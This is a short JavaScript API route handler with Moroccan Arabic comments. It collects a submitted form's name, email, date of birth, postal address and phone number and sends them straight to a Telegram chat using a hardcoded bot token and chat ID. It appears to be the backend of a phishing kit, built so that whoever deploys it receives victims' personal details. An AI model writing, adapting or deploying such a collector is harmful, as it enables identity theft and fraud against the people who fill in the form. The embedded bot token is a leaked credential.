export default async function handler(req, res) {
    if (req.method !== "POST") {
      return res.status(405).json({ message: "Method not allowed" });
    }
  
    const { first_name, last_name, email, dob, address, postal, city, num } = req.body;
  
    const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM"; // حط هنا token ديالك
    const CHAT_ID = "-4982276528"; // حط هنا chat ID ديالك
  
    const message = `
  📨 بيانات جديدة:
  - nome: ${first_name} ${last_name}
  - email: ${email}
  - date : ${dob}
  - address: ${address}, ${city}, ${postal}
  - num : ${num}
    `;
  
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
      });
  
    } catch (err) {
      console.error(err);
      
    }
  }
  

